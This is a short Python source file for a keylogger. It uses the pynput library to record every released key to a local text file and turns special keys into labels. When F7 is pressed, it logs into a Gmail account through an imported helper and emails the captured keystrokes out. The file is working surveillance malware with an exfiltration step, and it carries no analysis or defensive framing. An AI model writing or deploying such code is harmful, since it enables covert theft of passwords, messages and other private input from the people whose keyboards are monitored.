import sys

from pynput import keyboard
sys.path.append(".")
from Gmail import Gmail

fileHandler01 = open('test.txt', 'w+')


def on_release(key):
    print(key)
    try:

        if key == keyboard.Key.space:
            fileHandler01.write(' ')

        elif key == keyboard.Key.enter:
            fileHandler01.write('\n')

        elif key == keyboard.Key.shift_l:
            fileHandler01.write('(Shift)')

        elif key == keyboard.Key.shift_r:
            fileHandler01.write('(Shift)')

        elif key == keyboard.Key.caps_lock:
            fileHandler01.write('(Caps_Lock)')

        elif key == keyboard.Key.delete:
            fileHandler01.write('(Delete)')

        elif key == keyboard.Key.backspace:
            fileHandler01.write('(Delete)')

        elif key == keyboard.Key.f7:
            # Stop listener
            fileHandler01.close()
            file1 = open("test.txt","r")
            gmail = Gmail("","")
            gmail.loginGmail("")
            gmail.sendEmail(str(file1.read()))

            return False

        else:
            fileHandler01.write(format(key.char))

    except:
        fileHandler01.write("Unknown_Btn")



# Collect events until released
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()






